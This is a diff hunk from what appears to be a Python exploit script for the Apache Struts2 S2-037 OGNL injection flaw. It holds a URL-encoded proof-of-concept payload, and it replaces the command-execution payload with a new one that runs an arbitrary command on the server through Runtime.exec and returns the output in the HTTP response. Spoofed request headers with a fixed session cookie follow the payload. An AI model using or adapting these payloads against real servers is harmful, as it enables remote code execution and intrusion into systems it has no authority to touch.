@@ -31,8 +31,9 @@ banner = u'''\
 '''
 # PoC
 s2037_poc = "/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F((%23writ%3D(%23attr%5B%23parameters.com%5B0%5D%5D).getWriter())%2C%23writ.println(3345*2356))%3Aindex.xhtml?com=com.opensymphony.xwork2.dispatcher.HttpServletResponse"
+#
 # CommandExP
-cmd_exp = "/(%23mem=%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3f@java.lang.Runtime@getRuntime().exec(%23parameters.cmd):index.xhtml?cmd=ShowMeCommand"
+cmd_exp = "/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=ShowMeCommand"
 headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
             'Cookie': 'JSESSIONID=75C9ED1CD9345875BC5328D73DC76812',
             'referer': 'http://www.baidu.com/',
